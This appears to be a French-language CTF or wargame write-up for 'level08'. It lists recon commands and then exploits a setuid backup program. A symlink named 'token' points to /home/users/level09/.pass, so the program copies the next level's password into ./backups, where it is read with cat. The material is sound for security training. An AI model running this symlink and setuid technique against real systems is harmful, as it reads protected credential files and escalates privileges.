# Level08 -- commands

## Step 1 -- Recon

```bash
ls -la ./level08
file ./level08
checksec ./level08
```

Purpose: confirmer que le binaire est **setuid level09**, **NX disabled**, **Canary found**, **Full RELRO**, **No PIE**. Le canary empeche le stack overflow dans `log_wrapper` ; la vraie vulnerabilite est ailleurs.

---

## Step 2 -- Comprendre le programme

```bash
./level08
```

Sortie attendue : `Usage: ./level08 filename`. Le programme :
1. Ouvre **`./backups/.log`** en ecriture (log)
2. Ouvre **`argv[1]`** en lecture (avec les droits setuid)
3. Copie le contenu octet par octet dans **`./backups/<argv[1]>`**

---

## Step 3 -- Tentative directe (echec attendu)

```bash
mkdir -p /tmp/lvl08/backups
cd /tmp/lvl08
~/level08 /home/users/level09/.pass
```

Purpose: le programme lit le fichier grace au setuid, mais `open("./backups//home/users/level09/.pass", ...)` echoue car les sous-repertoires n'existent pas dans `./backups/`.

---

## Step 4 -- Exploit via lien symbolique

```bash
cd /tmp/lvl08
ln -sf /home/users/level09/.pass token
~/level08 token
cat ./backups/token
```

Purpose:
- **`ln -sf`** cree un symlink `token` -> `/home/users/level09/.pass`
- **`level08 token`** ouvre `token` en lecture (suit le symlink avec les droits setuid) → lit le `.pass`
- Le fichier de backup s'appelle **`./backups/token`** (pas de sous-repertoire) → `open` reussit
- **`cat ./backups/token`** affiche le mot de passe de **level09**

---

## Step 5 -- Se connecter au level suivant

```bash
su level09
```

Purpose: utiliser le mot de passe obtenu.

---

## Documentation

- Raisonnement : **`walkthrough`**
- Desassemblage : **`Ressources/disassembly.md`**
- Source reconstruite : **`source`**
